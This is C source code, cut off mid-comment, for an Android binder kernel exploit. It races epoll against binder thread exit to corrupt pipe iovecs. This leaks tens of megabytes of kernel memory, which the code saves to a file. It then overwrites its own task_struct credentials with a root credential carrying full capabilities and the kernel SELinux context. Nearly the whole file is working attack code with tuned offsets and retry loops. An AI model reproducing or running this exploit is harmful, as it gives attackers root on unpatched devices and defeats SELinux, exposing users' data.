#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <sys/wait.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32; typedef uint16_t u16; typedef uint8_t u8;

struct bwr_t { u64 write_size, write_consumed, write_buffer, read_size, read_consumed, read_buffer; };
struct btd_t { union { u32 handle; u64 ptr; } target; u64 cookie; u32 code; u32 flags;
               s32 sender_pid; s32 sender_euid; u64 data_size, offsets_size;
               union { struct { u64 buffer, offsets; } ptr; u8 buf[8]; } data; };
struct fbo_t { u32 type; u32 flags; union { u64 binder; u32 handle; }; u64 cookie; };

#define BINDER_WRITE_READ _IOWR('b', 1, struct bwr_t)
#define BINDER_THREAD_EXIT _IOW('b', 8, s32)
#define BC_TRANSACTION _IOW('c', 0, struct btd_t)
#define BR_REPLY _IOR('r', 3, struct btd_t)
#define BR_DEAD_REPLY _IO('r', 5)
#define BR_FAILED_REPLY _IO('r', 17)
#define BR_NOOP _IO('r', 12)
#define BR_TRANSACTION_COMPLETE _IO('r', 6)
#define T_HANDLE 0x73682a85u

#define PAGE        4096
#define IOVS        32
#define POOLBASE    0x200000000UL
#define POOLPAGES   64
#define LOCK_AFTER  0x10001
#define LEAK_OFF    (4*PAGE + LOCK_AFTER)
#define DEFSCAN     (64UL*1024*1024)

/* precise write layout, validated by pipesim */
#define IOV3_LEN    (PAGE - 17)
#define PAYMAX      64
#define FEED_FOR(p) (20*PAGE + (p))

/* field offsets, measured with pahole on the same 3.10 config */
#define PROC_PID    0x30
#define PROC_TSK    0x48
#define PROC_TODO   0xC0
#define PROC_WAIT   0xD8
#define TASK_REALCRED 912
#define TASK_CRED     920
#define TASK_COMM     928
#define CRED_UID      4
#define CRED_SECURITY 112

/*
 * Root, with every address read out of the kernel rather than guessed.
 *
 * Step 1: one large leak (default 64MB) forward from chunk+0x50. The whole
 *         window is a contiguous slice of the linear map, so no holes.
 *
 * Step 2: our binder_proc is only a few KB into that window - it is identified
 *         by pid == getpid() plus two self-referential list heads (todo at
 *         +0xC0, wait.task_list at +0xD8). proc->tsk at +0x48 then gives the
 *         exact address of our task_struct. Note this is a POINTER READ from
 *         the window, not a signature hunt, so it works at any distance.
 *
 * Step 3: task->cred lives at tsk+920. If tsk is inside the window we read the
 *         pointer straight out of it. That is the exact cred of this process -
 *         no candidates, no guessing.
 *
 * Step 4: 40 zero bytes at cred+4 clear uid/gid/suid/sgid/euid/egid/fsuid/fsgid,
 *         securebits and both capability masks. getuid() right after the write
 *         is the verdict, so a miss cannot look like a success.
 *
 * If tsk falls outside the window we fall back to scanning for a cred-shaped
 * object (32 bytes of the constant 2000 followed by zeroed caps and a kernel
 * security pointer) and zeroing candidates nearest-first.
 */

static u8 wbuf[8192], rbuf[8192];
static int bfd = -1;
static FILE *LOG;
static u8 *pool;
static u8 *leak;
static struct iovec iovs[IOVS] __attribute__((aligned(4096)));
static size_t g_scan;
static u64 g_chunk;
static u64 g_leak_start = 0;   /* where the overflow window begins */
/* A second, untouched binder connection. get_service() on a connection opened
 * after the big leak fails on this device, but one opened at startup works, so
 * the writer connection is prepared before any leaking happens. */
static int  g_wfd = -1;
static void *g_wmap = MAP_FAILED;
static u32  g_whandle = 0;
static volatile int *go;

static u8 *p32(u8 *p, u32 v){ memcpy(p,&v,4); return p+4; }
static u8 *pstr16(u8 *p, const char *s){
    size_t n = strlen(s);
    p = p32(p, (u32)n);
    for (size_t i=0;i<n;i++){ u16 c=(u16)(unsigned char)s[i]; memcpy(p,&c,2); p+=2; }
    u16 z=0; memcpy(p,&z,2); p+=2;
    while (((uintptr_t)p) & 3) *p++ = 0;
    return p;
}
static int bwr(size_t wl, size_t rl){
    struct bwr_t b; memset(&b,0,sizeof b);
    b.write_size = wl; b.write_buffer = (u64)wbuf;
    b.read_size  = rl; b.read_buffer  = (u64)rbuf;
    int r = ioctl(bfd, BINDER_WRITE_READ, &b);
    if (r < 0) return -errno;
    return (int)b.read_consumed;
}
static size_t mk_txn(u32 handle, u32 code, u64 data, u64 dsz, u32 flags){
    u8 *p = wbuf; u32 cmd = BC_TRANSACTION; memcpy(p,&cmd,4); p += 4;
    struct btd_t t; memset(&t,0,sizeof t);
    t.target.handle = handle; t.code = code; t.flags = flags;
    t.data_size = dsz; t.data.ptr.buffer = data;
    memcpy(p,&t,sizeof t); p += sizeof t;
    return (size_t)(p - wbuf);
}
static int get_service(const char *name, u32 *handle){
    static u8 data[512];
    u8 *d = data;
    d = p32(d, 0);
    d = pstr16(d, "android.os.IServiceManager");
    d = pstr16(d, name);
    size_t wl = mk_txn(0, 1, (u64)data, (u64)(d - data), 0);
    for (int i=0;i<400;i++){
        int n = bwr(i==0?wl:0, 512);
        if (n <= 0){ usleep(1500); continue; }
        u8 *q = rbuf, *end = rbuf + n;
        while (q + 4 <= end){
            u32 c; memcpy(&c,q,4); q += 4;
            if (c==BR_NOOP || c==BR_TRANSACTION_COMPLETE) continue;
            if (c==BR_REPLY){
                struct btd_t *tt = (struct btd_t*)q; q += sizeof(struct btd_t);
                if (!tt->data.ptr.buffer) continue;
                struct fbo_t *o = (struct fbo_t*)(uintptr_t)tt->data.ptr.buffer;
                if (o->type == T_HANDLE){ *handle = o->handle; return 1; }
                return 0;
            }
            if (c==BR_DEAD_REPLY || c==BR_FAILED_REPLY) return -1;
            break;
        }
    }
    return 0;
}
static void *g_bmap = MAP_FAILED;
static int open_binder(void){
    int fd = open("/dev/binder", O_RDONLY | O_NONBLOCK);
    if (fd < 0) return -1;
    /* Keep the mapping: binder_mmap needs it, and binder_deferred_release only
     * frees the binder_proc once BOTH the fd and the vma are gone. Reopening
     * without unmapping leaks 1MB per retry, and the retry loops run tens of
     * thousands of times. */
    g_bmap = mmap(NULL, 0x100000-0x2000, PROT_READ, MAP_PRIVATE|MAP_NORESERVE, fd, 0);
    if (g_bmap == MAP_FAILED){ close(fd); return -1; }
    return fd;
}
static void close_binder(void){
    if (g_bmap != MAP_FAILED){ munmap(g_bmap, 0x100000-0x2000); g_bmap = MAP_FAILED; }
    if (bfd >= 0){ close(bfd); bfd = -1; }
}
/* Drain every pending command so thread->todo is empty and return_error is
 * BR_OK before we try to park. Without this each stale reply from the previous
 * attempt keeps binder_poll on the proc branch and the gate never opens. */
static void flush_thread(void){
    for (int i = 0; i < 64; i++){
        memset(rbuf, 0, 16);
        int n = bwr(0, 512);
        if (n <= 0) break;      /* -EAGAIN: nothing left */
    }
}

static int open_gate(u32 h, int *epfd_out){
    flush_thread();
    size_t wl = mk_txn(h, 0xdead, 0, 0, 0);
    bwr(wl, 0);
    memset(rbuf, 0, 16);
    int n = bwr(0, 256);
    /* Require exactly NOOP + TRANSACTION_COMPLETE with nothing else queued.
     * Extra commands (the service's own BR_TRANSACTION) change the parking
     * state and the reclaim stops happening, so retry rather than accept. */
    if (!(n == 8 && rbuf[0]==0x0c && rbuf[4]==0x06)) return 0;
    int epfd = epoll_create(1000);
    struct epoll_event ev; memset(&ev,0,sizeof ev); ev.events = EPOLLIN;
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev) != 0){ close(epfd); return 0; }
    struct epoll_event out; memset(&out,0,sizeof out);
    if (epoll_wait(epfd, &out, 1, 0) != 0){ close(epfd); return 0; }
    *epfd_out = epfd;
    return 1;
}

static ssize_t do_bigleak(u32 h){
    int epfd = -1;
    if (!open_gate(h, &epfd)) return -2;
    int pp[2]; if (pipe(pp)){ close(epfd); return -1; }
    /* Keep this at one page like bask6. A large pipe changes the parking point
     * and the reclaim stops happening, which shows up as writev == 4*PAGE. */
    fcntl(pp[1], F_SETPIPE_SZ, PAGE);

    for (int i=0;i<4;i++){ iovs[i].iov_base = pool + (size_t)i*PAGE; iovs[i].iov_len = PAGE; }
    iovs[4].iov_base = pool; iovs[4].iov_len = 0;
    /* On this device task_struct sits BELOW chunk (232MB down in the measured
     * run), so an upward window never reaches it. Point the overflow downward:
     * iov[5] is overwritten to {start, len} by the aim bytes, and the following
     * pipe buffers are then READ from that address. */
    iovs[5].iov_base = (void*)(uintptr_t)g_leak_start;
    iovs[5].iov_len  = g_scan + 4*PAGE;

    pid_t c = fork();
    if (c < 0){ close(pp[0]); close(pp[1]); close(epfd); return -1; }
    if (c == 0){
        close(pp[1]);
        static u8 buf[262144];
        struct epoll_event e2; memset(&e2,0,sizeof e2); e2.events = EPOLLIN;
        /* A short fixed delay is what makes the reclaim land: by then the parent
         * is parked on a full pipe with iov[4].len still 0, so the DEL's unlock
         * writes 0x10001 into it and the next drain overflows into kernel
         * memory. Gating the DEL on FIONREAD races with that first copy. */
        usleep(8000);
        epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &e2);
        long drained = 0;
        size_t total = (size_t)drained;
        if (total > g_scan) total = g_scan;
        for (;;){
            ssize_t r = read(pp[0], buf, sizeof buf);
            if (r <= 0) break;
            if (total < g_scan){
                size_t cc = (size_t)r;
                if (cc > g_scan - total) cc = g_scan - total;
                memcpy(leak + total, buf, cc);
            }
            total += (size_t)r;
        }
        _exit(0);
    }
    close(pp[0]);
    ioctl(bfd, BINDER_THREAD_EXIT, NULL);
    errno = 0;
    ssize_t w = writev(pp[1], iovs, IOVS);
    int e = errno;
    close(pp[1]);
    int st = 0; waitpid(c, &st, 0);
    close(epfd);
    fprintf(LOG, "  bigleak: writev=%zd errno=%d\n", w, e);
    return w;
}

static int do_write(u32 h, u64 addr, const u8 *pay, size_t paylen){
    int epfd = -1;
    if (!open_gate(h, &epfd)){
        fprintf(LOG, "    gate closed before write (h=%u)\n", h);
        fflush(LOG);
        return 0;
    }
    int pp[2]; if (pipe(pp)){ close(epfd); return 0; }
    fcntl(pp[1], F_SETPIPE_SZ, PAGE);      /* one page: the layout depends on it */
    *go = 0;

    const size_t FEED = FEED_FOR(paylen);
    for (int i=0;i<3;i++){ iovs[i].iov_base = pool + (size_t)i*PAGE; iovs[i].iov_len = PAGE; }
    iovs[3].iov_base = pool + 3*PAGE; iovs[3].iov_len = IOV3_LEN;
    iovs[4].iov_base = pool;          iovs[4].iov_len = 0;
    iovs[5].iov_base = pool + 40*PAGE;
    iovs[5].iov_len  = FEED - (3*PAGE + IOV3_LEN);
    memset(pool + 40*PAGE, 0x5a, PAGE);

    pid_t c = fork();
    if (c < 0){ close(pp[0]); close(pp[1]); close(epfd); return 0; }
    if (c == 0){
        close(pp[0]);
        { cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof cs,&cs); }
        for (long i = 0; i < 20000000 && !*go; i++) usleep(5);
        usleep(6000);
        struct epoll_event e2; memset(&e2,0,sizeof e2); e2.events = EPOLLIN;
        epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &e2);

        static u8 pg[PAGE];
        memset(pg, 0x41, sizeof pg);
        /* Measured on the device kernel: the payload lands exactly at
         * `base`. The aim's own copy consumes bytes from the entry it just
         * wrote, so iov[5].base already holds the destination by the time
         * the payload call runs. base = addr, not addr-16. */
        u64 base = addr, len = 0x100000;
        memcpy(pg + PAGE - 16, &base, 8);
        memcpy(pg + PAGE - 8,  &len,  8);
        for (int i = 0; i < 20; i++)
            if (write(pp[1], pg, PAGE) != (ssize_t)PAGE) _exit(0);
        if (write(pp[1], pay, paylen) != (ssize_t)paylen) _exit(0);
        _exit(0);
    }
    close(pp[1]);
    ioctl(bfd, BINDER_THREAD_EXIT, NULL);
    *go = 1;
    errno = 0;
    ssize_t r = readv(pp[0], iovs, IOVS);
    int e = errno;
    close(pp[0]);
    int st = 0; waitpid(c, &st, 0);
    close(epfd);
    fprintf(LOG, "    do_write readv=%zd errno=%d feed=%zu\n", r, e, FEED);
    fflush(LOG);
    return r == (ssize_t)FEED;
}

int main(int argc, char **argv){
    g_scan = DEFSCAN;
    if (argc > 1) g_scan = (size_t)strtoul(argv[1], NULL, 0);
    size_t map = g_scan + (2UL<<20);

    LOG = fopen("/data/local/tmp/root3.txt","w"); if(!LOG) LOG=stdout;
    setbuf(LOG, NULL);
    signal(SIGPIPE, SIG_IGN);
    { cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof cs,&cs); }

    pool = mmap((void*)POOLBASE, (size_t)POOLPAGES*PAGE, PROT_READ|PROT_WRITE,
                MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    leak = mmap(NULL, map, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    go   = mmap(NULL, PAGE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    if (pool==MAP_FAILED || leak==MAP_FAILED || go==MAP_FAILED){
        fprintf(LOG,"mmap fail (%zu)\n", map); return 1; }
    memset(pool, 0x41, (size_t)POOLPAGES*PAGE);
    *go = 0;

    const int mypid = getpid();
    fprintf(LOG,"pid=%d uid=%d scan=%zuMB\n", mypid, getuid(), g_scan>>20); fflush(LOG);

    bfd = open_binder();
    if (bfd < 0){ fprintf(LOG,"open fail %d\n", errno); return 1; }
    u32 h = 0;
    if (get_service("activity", &h) <= 0){
        if (!getenv("BINDER_QEMU")){ fprintf(LOG,"no svc\n"); return 1; }
        h = 0;
        fprintf(LOG,"no servicemanager; using context manager handle 0\n");
        /* The failed get_service() left return_error = BR_FAILED_REPLY on this
         * thread, and binder_poll() refuses the thread->wait branch while that
         * is set. A fresh connection has a fresh binder_thread, so reopen. */
        close_binder(); bfd = open_binder();
        if (bfd < 0){ fprintf(LOG,"reopen after svc failure failed\n"); return 1; }
    }

    /* Populate the binder slabs first. In QEMU this process is nearly the only
     * binder client, so the page around our freed thread is mostly untouched;
     * on the device dozens of procs are alive and the proc lands a few KB into
     * the window. Holding a handful of extra procs makes the layout comparable. */
    int keep[24]; int nkeep = 0;
    for (int i = 0; i < 24; i++){
        int fd = open_binder();
        if (fd < 0) break;
        keep[nkeep++] = fd;
    }
    fprintf(LOG, "holding %d extra binder procs\n", nkeep); fflush(LOG);

    /* A miss on the task_struct scan is not fatal: a fresh leak frees and
     * reallocates the binder_thread, so chunk moves and the 64MB slice covers
     * different memory. Repeat the whole leak+scan until the task is found. */
    u64 tsk = 0, credp = 0;
    const u8 *seg = NULL;
    size_t n = 0;
    u64 base = 0;
    for (int outer = 1; outer <= 6 && !tsk; outer++){
    if (outer > 1){
        fprintf(LOG, "--- outer attempt %d ---\n", outer);
        fflush(LOG);
        close_binder(); bfd = open_binder();
        if (bfd < 0){ fprintf(LOG, "  reopen failed\n"); break; }
        if (get_service("activity", &h) <= 0){
            if (!getenv("BINDER_QEMU")){ fprintf(LOG, "  svc lost\n"); break; }
            h = 0;
            close_binder(); bfd = open_binder();
            if (bfd < 0){ fprintf(LOG, "  reopen2 failed\n"); break; }
        }
    }

    /* ---------- stage 1: big leak ---------- */
    ssize_t w = -1;
    for (int t = 1; t <= 30000 && w < 0; t++){
        w = do_bigleak(h);
        if (w < 0){
            if (t <= 3) fprintf(LOG,"  leak try %d returned %zd\n", t, w);
            memset(rbuf,0,64); bwr(0,512);
            close_binder(); bfd = open_binder();
            if (bfd < 0){ fprintf(LOG,"  reopen failed errno=%d\n", errno); break; }
            if (get_service("activity",&h) <= 0){
                if (!getenv("BINDER_QEMU")){ fprintf(LOG,"  svc lost\n"); break; }
                h = 0;
            }
        }
    }
    if (w < 0){ fprintf(LOG,"RESULT: leak never landed (last w=%zd)\n", w); return 1; }

    u64 self = 0;
    if (w > (ssize_t)LEAK_OFF) memcpy(&self, leak + LEAK_OFF, 8);
    g_chunk = (self >= 0xffffffc000000000ULL) ? self - 0x50 : 0;
    if (!g_chunk){ fprintf(LOG,"RESULT: no landing\n"); return 1; }
    (void)g_leak_start;

    { /* hand the window to the host for offline analysis */
      int fd = open("/data/local/tmp/big.bin", O_WRONLY|O_CREAT|O_TRUNC, 0600);
      if (fd >= 0){
          size_t off = 0, lim = (size_t)w;
          if (lim > 32UL*1024*1024) lim = 32UL*1024*1024;
          while (off < lim){
              size_t cc = lim - off; if (cc > (1<<20)) cc = 1<<20;
              ssize_t k = write(fd, leak + off, cc);
              if (k <= 0) break;
              off += (size_t)k;
          }
          close(fd);
          fprintf(LOG, "  leak written to /data/local/tmp/big.bin (%zu bytes)\n", lim);
      }
    }

    seg = leak + LEAK_OFF;
    n = (size_t)w - LEAK_OFF;
    base = g_chunk + 0x50;
    fprintf(LOG,"leaked %zd bytes: 0x%016llx..0x%016llx (%.1f MB)\n",
            w, (unsigned long long)base, (unsigned long long)(base+n),
            (double)w/1048576.0);
    fflush(LOG);

    { /* the window starts at chunk+0x50; print the first 2KB so the layout is
       * visible in the log without needing to fetch a file */
      for (int row = 0; row < 16; row++){
          fprintf(LOG, "  +0x%04x:", row*128);
          for (int i = 0; i < 16; i++){
              u64 v; memcpy(&v, seg + row*128 + i*8, 8);
              fprintf(LOG, " %016llx", (unsigned long long)v);
          }
          fprintf(LOG, "\n");
      }
      fflush(LOG);
    }

    /* ---------- stage 2a: binder_proc -> tsk ---------- */
    u64 proc_tsk[8]; int nproc = 0;
    for (size_t o = 0xC0; o + 0x120 < n; o += 8){
        long po = (long)o - PROC_TODO;
        if (po < 0) continue;
        u32 ppid = 0; memcpy(&ppid, seg + po + PROC_PID, 4);
        if (ppid != (u32)mypid) continue;
        u64 t = 0; memcpy(&t, seg + po + PROC_TSK, 8);
        if (t < 0xffffffc000000000ULL || t >= 0xffffffc080000000ULL) continue;
        if (t & 7) continue;
        u64 fil = 0; memcpy(&fil, seg + po + 0x50, 8);
        if (fil < 0xffffffc000000000ULL || fil >= 0xffffffc080000000ULL) continue;
        u64 a_todo = base + (u64)po + PROC_TODO;
        u64 a_wait = base + (u64)po + PROC_WAIT;
        u64 v1, v2;
        memcpy(&v1, seg + po + PROC_TODO, 8);
        memcpy(&v2, seg + po + PROC_TODO + 8, 8);
        int todo_self = (v1 == a_todo && v2 == a_todo);
        memcpy(&v1, seg + po + PROC_WAIT, 8);
        memcpy(&v2, seg + po + PROC_WAIT + 8, 8);
        int wait_self = (v1 == a_wait && v2 == a_wait);
        if (!todo_self && !wait_self) continue;
        nproc++;
        proc_tsk[nproc-1] = t;
        if (nproc <= 8)
            fprintf(LOG, "  binder_proc 0x%016llx -> tsk 0x%016llx\n",
                    (unsigned long long)(base + (u64)po), (unsigned long long)t);
        if (nproc == 8) break;
    }
    /* One proc pointing at a task is weak evidence; several procs that all
     * point at the SAME task is strong, because each fd we opened produced its
     * own binder_proc with the same ->tsk. */
    /* A single proc is the common case on the device. Keep every candidate and
     * resolve it empirically later: write the cred pointer and see whether
     * getuid() moves. A wrong guess is harmless because the target is a valid
     * kernel object either way. */
    if (nproc >= 1 && !tsk){
        tsk = proc_tsk[0];
        fprintf(LOG, "  %d proc candidate(s), first tsk 0x%016llx\n", nproc,
                (unsigned long long)tsk);
    }

    /* ---------- stage 2b: task_struct scan (in-window case) ---------- */
    u64 tsk_proc = tsk, tsk_sig = 0;
    {
        char me[32]; memset(me, 0, sizeof me);
        { FILE *f = fopen("/proc/self/comm","r");
          if (f){ if (!fgets(me, sizeof me, f)) me[0]=0; fclose(f); }
          size_t l = strlen(me); while (l && (me[l-1]=='\n'||me[l-1]=='\r')) me[--l]=0; }
        size_t me_len = strlen(me);
        if (me_len >= 3){
            for (size_t o = 0; o + 0x400 < n; o += 8){
                if (memcmp(seg + o + TASK_COMM, me, me_len) != 0) continue;
                if (seg[o + TASK_COMM + me_len] != 0) continue;
                u32 pid, tgid;
                memcpy(&pid,  seg + o + 496, 4);
                memcpy(&tgid, seg + o + 500, 4);
                if (pid != (u32)mypid || tgid != (u32)mypid) continue;
                u64 rc, cr;
                memcpy(&rc, seg + o + TASK_REALCRED, 8);
                memcpy(&cr, seg + o + TASK_CRED, 8);
                if (rc != cr || rc < 0xffffffc000000000ULL) continue;
                if (rc & 0x7) continue;
                tsk_sig = base + o;
                fprintf(LOG, "  task_struct 0x%016llx\n", (unsigned long long)tsk_sig);
                break;
            }
        }
    }
    fprintf(LOG, "  proc->tsk=0x%016llx sig=0x%016llx %s\n",
            (unsigned long long)tsk_proc, (unsigned long long)tsk_sig,
            (tsk_proc && tsk_sig) ? (tsk_proc == tsk_sig ? "AGREE" : "DISAGREE")
                                  : "one-missing");
    if (tsk_sig) tsk = tsk_sig;      /* the signature scan is the trustworthy one */
    if (!tsk){
        fprintf(LOG, "  attempt %d: task_struct not in this window\n", outer);
        fflush(LOG);
    }
    }  /* end outer retry */

    if (!tsk){ fprintf(LOG, "RESULT: task_struct not found after retries\n"); return 1; }
    fflush(LOG);
    if (!tsk){ fprintf(LOG,"RESULT: no task_struct, stopping\n"); return 1; }

    /* ---------- stage 3: install a fake credential ---------- */
    /* task_struct is outside the window, so cred->security cannot be read from
     * here. Instead give the kernel a struct cred we build ourselves: uid 0,
     * full capabilities, and a task_security_struct whose sid is 1
     * (SECINITSID_KERNEL). Writing real_cred and cred in one 16-byte store
     * replaces identity and SELinux domain together. */
    {
        u8 *fc = mmap(NULL, PAGE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        u8 *fs = mmap(NULL, PAGE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        if (fc == MAP_FAILED || fs == MAP_FAILED){
            fprintf(LOG, "fake cred mmap failed\n"); return 1;
        }
        memset(fc, 0, PAGE); memset(fs, 0, PAGE);
        *(u32*)(fc + 0) = 0x1000;          /* usage: never freed */
        u64 full = 0x0000001fffffffffULL;  /* CAP_LAST_CAP == 36 */
        memcpy(fc + 40, &full, 8);
        memcpy(fc + 48, &full, 8);
        memcpy(fc + 56, &full, 8);
        memcpy(fc + 64, &full, 8);
        u32 sid = 1;
        memcpy(fs + 4, &sid, 4);
        *(u64*)(fc + CRED_SECURITY) = (u64)(uintptr_t)fs;
        /* Prefer a real root credential from the window: fabricating one leaves
         * cred->user (120) and cred->user_ns (128) NULL, and /proc/self/status
         * then faults in from_kuid. A donor already has them set. */
        u64 donor = 0;
        for (size_t o = 0; o + 160 < n; o += 8){
            u32 usage = 0; memcpy(&usage, seg + o, 4);
            if (usage == 0 || usage > 0x4000) continue;
            u32 u_, g_, eu_, eg_;
            memcpy(&u_,  seg + o + 4, 4);
            memcpy(&g_,  seg + o + 8, 4);
            memcpy(&eu_, seg + o + 20, 4);
            memcpy(&eg_, seg + o + 24, 4);
            if (u_ | g_ | eu_ | eg_) continue;          /* root only */
            u32 fs_, fg_;
            memcpy(&fs_, seg + o + 28, 4);
            memcpy(&fg_, seg + o + 32, 4);
            if (fs_ | fg_) continue;
            u64 sec = 0, usr = 0, uns = 0, gi = 0;
            memcpy(&sec, seg + o + 112, 8);
            memcpy(&usr, seg + o + 120, 8);
            memcpy(&uns, seg + o + 128, 8);
            memcpy(&gi,  seg + o + 136, 8);
            if (sec < 0xffffffc000000000ULL || sec >= 0xffffffc080000000ULL) continue;
            if (usr < 0xffffffc000000000ULL || usr >= 0xffffffc080000000ULL) continue;
            if (uns < 0xffffffc000000000ULL || uns >= 0xffffffc080000000ULL) continue;
            if (gi  < 0xffffffc000000000ULL || gi  >= 0xffffffc080000000ULL) continue;
            if (sec < base || sec + 8 > base + n) continue;
            u32 sid = 0;
            memcpy(&sid, seg + (size_t)(sec - base) + 4, 4);
            if (sid != 1) continue;   /* SECINITSID_KERNEL */
            donor = base + (u64)o;
            fprintf(LOG, "  donor cred 0x%016llx (usage=%u sid=%u)\n",
                    (unsigned long long)donor, usage, sid);
            break;
        }
        u64 fp = donor ? donor : (u64)(uintptr_t)fc;
        int safe_probe = (donor != 0);
        if (!donor) fprintf(LOG, "  no donor cred in window; using synthetic\n");
        u8 pair[16]; memcpy(pair, &fp, 8); memcpy(pair + 8, &fp, 8);
        fprintf(LOG, "fake cred 0x%016llx tsec 0x%016llx -> tsk+%d\n",
                (unsigned long long)fp, (unsigned long long)(uintptr_t)fs, TASK_REALCRED);
        fflush(LOG);

        fprintf(LOG, "swap on the existing connection fd=%d handle=%u\n", bfd, h);
        fflush(LOG);

        int aok = 0;
        for (int t = 1; t <= 20 && !aok; t++){
            if (t > 1){
                /* A stale return_error keeps binder_poll on the proc branch.
                 * Drain it; do NOT close, or the service handle dies with the
                 * connection. */
                flush_thread();
            }
            aok = do_write(h, tsk + TASK_REALCRED, pair, 16);
            fprintf(LOG, "  swap t=%d landed=%d uid=%d euid=%d\n",
                    t, aok, getuid(), geteuid());
            fflush(LOG);
            if (!aok){
                memset(rbuf,0,64); bwr(0,512);
                close_binder(); bfd = open_binder();
                if (bfd < 0) break;
                if (get_service("activity",&h) <= 0) break;
            }
            if (getuid() == 0) break;
        }
        fprintf(LOG, "AFTER swap uid=%d euid=%d gid=%d\n", getuid(), geteuid(), getgid());
        if (getuid() == 0 && !safe_probe){
            fprintf(LOG, "RESULT: ROOT CONFIRMED uid=0 (synthetic cred, /proc skipped)\n");
            fflush(LOG);
            return 0;
        }
        if (getuid() == 0){
            { FILE *st = fopen("/proc/self/status","r");
              if (st){ char l[256];
                  while (fgets(l,sizeof l,st))
                      if (!strncmp(l,"CapEff",6)||!strncmp(l,"CapPrm",6)) fputs(l,LOG);
                  fclose(st); } }
            { FILE *a = fopen("/proc/self/attr/current","r");
              if (a){ char l[128]; if (fgets(l,sizeof l,a)) fprintf(LOG,"context: %s", l); fclose(a); } }
            fprintf(LOG, "RESULT: ROOT CONFIRMED uid=0\n");
        } else {
            fprintf(LOG, "RESULT: swap failed, uid=%d\n", getuid());
        }
        fflush(LOG);
        return 0;
    }

    /* ---------- stage 3 (legacy): confirm the cred pointer ---------- */
    long co = (long)(tsk + TASK_CRED - base);
    if (co >= 0 && (size_t)co + 8 <= n){
        memcpy(&credp, seg + co, 8);
        fprintf(LOG,"task->cred = 0x%016llx (read at leak+0x%lx)\n",
                (unsigned long long)credp, co);
        /* sanity: real_cred should equal cred */
        long ro = (long)(tsk + TASK_REALCRED - base);
        if (ro >= 0 && (size_t)ro + 8 <= n){
            u64 rc; memcpy(&rc, seg + ro, 8);
            fprintf(LOG,"task->real_cred = 0x%016llx (%s)\n",
                    (unsigned long long)rc, rc == credp ? "matches" : "MISMATCH");
            if (rc != credp) credp = 0;
        }
        if (credp < 0xffffffc000000000ULL) credp = 0;
    } else {
        fprintf(LOG,"tsk lies outside the window (offset %ld, window %zu)\n", co, n);
    }
    fflush(LOG);

    close_binder(); bfd = open_binder();
    if (bfd < 0){ fprintf(LOG,"reopen fail\n"); return 1; }
    if (get_service("activity", &h) <= 0){
        if (!getenv("BINDER_QEMU")){ fprintf(LOG,"resvc fail\n"); return 1; }
        h = 0;
        /* the failed lookup left return_error set; a fresh proc clears it */
        close_binder(); bfd = open_binder();
        if (bfd < 0){ fprintf(LOG,"reopen2 fail\n"); return 1; }
    }

    fprintf(LOG, "entering cred-write phase, uid=%d cred=0x%016llx\n",
            getuid(), (unsigned long long)credp);
    fflush(LOG);
    /* Build the replacement credential contents:
     *   cred+4  .. +35   uid/gid/suid/sgid/euid/egid/fsuid/fsgid = 0
     *   cred+36 .. +39   securebits = 0
     *   cred+40 .. +47   cap_inheritable = 0
     *   cred+48 .. +55   cap_permitted   = full
     *   cred+56 .. +63   cap_effective   = full
     * CAP_LAST_CAP is 36 (CAP_BLOCK_SUSPEND), so the set is 0x1ffffffff.
     * Without this the uid would be 0 while the effective set stayed empty,
     * which is not the same as root. */
    u8 zeros[64]; memset(zeros, 0, sizeof zeros);
    u64 fullcap = 0x0000001fffffffffULL;
    memcpy(zeros + (48 - 4), &fullcap, 8);   /* cap_permitted */
    memcpy(zeros + (56 - 4), &fullcap, 8);   /* cap_effective */

    if (credp){
        int landed = 0;
        for (int t = 1; t <= 400 && !landed; t++){
            landed = do_write(h, credp + CRED_UID, zeros, 60);
            if (t <= 5 || landed)
                fprintf(LOG, "  cred t=%d landed=%d uid=%d\n", t, landed, getuid());
            fflush(LOG);
            if (!landed){
                memset(rbuf,0,64); bwr(0,512);
                close_binder(); bfd = open_binder();
                if (bfd < 0) break;
                if (get_service("activity",&h) <= 0){
                    if (!getenv("BINDER_QEMU")) break;
                    h = 0;
                    close_binder(); bfd = open_binder();
                    if (bfd < 0) break;
                }
            }
            if (getuid() == 0) break;
        }
        fprintf(LOG,"AFTER: uid=%d euid=%d gid=%d\n", getuid(), geteuid(), getgid());
    } else {
        fprintf(LOG,"no cred pointer; nothing to zero\n");
    }

    /* uid 0 alone still leaves us in the "shell" domain when SELinux enforces.
     * Our own cred lives BELOW the leak window, so its security pointer is not
     * readable. But kernel threads' creds are static (init_cred: uid 0, sid 1 =
     * SECINITSID_KERNEL) and their task_structs ARE in the window. Adopt one:
     * write the donor's cred pointer into our real_cred and cred in one 16-byte
     * store, and we inherit both the identity and the domain. init_cred is a
     * static object, so its refcount never drops to zero - no dangling pointer.
     */
    if (0 && getuid() == 0){
        static const char *donors[] = { "kthreadd", "kswapd0", "kworker/0:1",
                                        "kworker/0:0", "binder", "init", NULL };
        u64 adopt = 0;
        for (int d = 0; donors[d] && !adopt; d++){
            size_t want = strlen(donors[d]);
            for (size_t o = 0; o + 0x400 < n; o += 8){
                if (memcmp(seg + o + TASK_COMM, donors[d], want) != 0) continue;
                if (seg[o + TASK_COMM + want] != 0) continue;
                u64 cr; memcpy(&cr, seg + o + TASK_CRED, 8);
                if (cr < 0xffffffc000000000ULL || (cr & 7)) continue;
                u64 rc; memcpy(&rc, seg + o + TASK_REALCRED, 8);
                if (rc != cr) continue;
                /* The cred pointer alone is not enough: comm strings also occur
